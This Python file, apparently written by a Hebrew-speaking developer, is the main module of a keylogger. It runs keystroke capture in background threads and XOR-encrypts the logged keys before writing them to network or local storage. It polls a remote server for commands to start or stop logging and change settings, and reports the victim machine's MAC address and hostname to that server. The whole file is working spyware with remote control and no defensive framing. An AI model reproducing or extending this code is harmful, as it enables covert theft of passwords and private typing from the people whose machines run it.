import time
import datetime
import threading
import uuid
from key_logger import KeyLogger
from encryption import Encryption
from api_server import RequestManager
from writer import Write_keys
import socket


class Main:
    def __init__(self):
        self.run_keylog = Manager(timeLimit=0)
        self.keep_reporting = True  # דגל שימשיך לדווח גם לאחר שהפסיק את הקילוג
        self.start_keylog()  # תיקון שגיאת כתיב
        self.start_check_server()

    def start_keylog(self):  # תיקון שגיאת כתיב
        threading.Thread(target=self.run_keylog.start, daemon=True).start()

    def start_check_server(self):
        threading.Thread(target=self.report_status_loop, daemon=True).start()

    def report_status_loop(self):
        while self.keep_reporting:
            response = RequestManager().handle_request(method='GET', request_type="status")
            s_naw = self.run_keylog.status_naw()
            print("4444444")
            if response:
                if response.status_code == 200:  # יש שינויים
                    try:
                        new_status = response.json()
                        print(f"שינויים שהתקבלו מהשרת: {new_status}")
                        if "storageLocation" in new_status:
                            s_naw["storageLocation"] = new_status["storageLocation"]
                        if "timeLimit" in new_status:
                            s_naw["timeLimit"] = new_status["timeLimit"] if new_status["timeLimit"] is not None else 0
                        if "saveFrequency" in new_status:
                            s_naw["time_wright"] = new_status["saveFrequency"]
                        if "isLogging" in new_status:
                            s_naw["isLogging"] = new_status["isLogging"]
                            if new_status["isLogging"]:
                                self.run_keylog.keylogger.start_logging()  # תיקון
                            else:
                                self.run_keylog.keylogger.stop_logging()  # תיקון
                    except Exception as e:
                        print(f"שגיאה בעיבוד השינויים: {e}")
                elif response.status_code == 404:  # אין שינויים
                    print("אין שינויים זמינים בשרת")
                self.run_keylog.stop()
                self.run_keylog = Manager(
                    timeLimit=s_naw["timeLimit"],
                    storageLocation=s_naw["storageLocation"],
                    time_wright=s_naw["time_wright"]
                )
                self.run_keylog.is_logging = s_naw["isLogging"]  # שמירת מצב ההאזנה
                if self.run_keylog.is_logging:
                    self.start_keylog()
                self.server_status_update("true" if self.run_keylog.running else "false")
            else:
                print("לא התקבלה תגובה מהשרת")
            time.sleep(40)

    def server_status_update(self, connected):  # הוספת שיטה חסרה
        self.run_keylog.server_status_update(connected)


class Manager:
    def __init__(self, timeLimit=0, storageLocation="network", time_wright=20):
        self.time_wright = time_wright
        self.keylogger = KeyLogger()
        self.write_keys = Write_keys()
        self.encryption = Encryption(5)
        self.running = False
        self.is_logging = True  # ברירת מחדל: האזנה פעילה
        self.storageLocation = storageLocation
        self.timeLimit = timeLimit
        self.hostname = socket.gethostname()

    def collect_keys(self):
        start_time = time.time()
        while self.running:
            try:
                time.sleep(self.time_wright)
                logged_keys = self.keylogger.get_logged_keys()
                if logged_keys:
                    timestamp = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
                    data = {timestamp: logged_keys}
                    encrypted_data = self.encryption.xor_encrypt_decrypt_dict_list(data)
                    print("----------------------6666666-----------")
                    self.write_keys.handle_write(self.storageLocation, encrypted_data)
                    print("------------------7777---------------")
                    self.keylogger.clear_buffer()

                if self.timeLimit > 0 and time.time() - start_time >= self.timeLimit:
                    self.stop()
                    self.server_status_update("false")
            except Exception as e:
                print(f"Error collecting keystrokes: {e}")

    def server_status_update(self, connected):
        mac_address = ':'.join(f'{(uuid.getnode() >> i) & 0xff:02x}' for i in range(0, 48, 8))
        status = {
            "mac_address": mac_address,
            "name": self.hostname,
            "connected": connected,
            "timeLimit": self.timeLimit,
            "storageLocation": self.storageLocation,
            "isLogging": self.is_logging,
            "lastSeen": datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
        }
        print(f"Sending status update: {status}")
        RequestManager().handle_request('POST', "status", status)

    def status_naw(self):
        status = {
            "timeLimit": self.timeLimit,
            "storageLocation": self.storageLocation,
            "time_wright": self.time_wright,
            "isLogging": self.is_logging
        }
        return status

    def start(self):
        if not self.running and self.is_logging:
            self.running = True
            self.keylogger.start_logging()
            threading.Thread(target=self.collect_keys, daemon=True).start()
            self.server_status_update("true")

    def stop(self):
        self.running = False
        self.keylogger.stop_logging()


if __name__ == '__main__':
    a = Main()
    while True:
        time.sleep(1)  # השאר את התוכנית פעילה
